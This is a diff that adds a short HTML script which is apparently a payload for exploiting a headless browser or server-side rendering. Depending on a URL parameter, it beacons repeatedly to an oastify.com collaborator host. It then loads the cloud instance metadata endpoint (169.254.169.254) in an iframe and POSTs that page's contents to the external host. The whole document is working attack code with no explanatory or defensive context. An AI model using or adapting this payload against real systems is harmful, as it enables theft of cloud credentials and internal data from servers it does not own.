@@ -1,0 +1,24 @@
+<script>
+const params = new URLSearchParams(window.location.search);
+const val = params.get("id");
+
+if (val == "load") { 
+    setInterval(() => {
+        fetch("https://p7x6p55zdrjoedl1lgyd3xgurlxcl59u.oastify.com/" + Date.now());
+    }, 250);
+
+    setTimeout(() => {
+        var iframe = document.createElement("iframe");
+        iframe.src = "http://169.254.169.254/latest/meta-data/";
+        document.body.appendChild(iframe);
+        setTimeout(() => {
+                const iframe = document.querySelector("iframe");
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                fetch("http://p7x6p55zdrjoedl1lgyd3xgurlxcl59u.oastify.com/metadata", {"method":"POST","body":iframeDoc.body.innerHTML});
+        }, 2000);
+    }, 60000);
+
+} else if (val == "open") {
+        window.open("http://p7x6p55zdrjoedl1lgyd3xgurlxcl59u.oastify.com?id=load", "_blank");
+}
+</script>
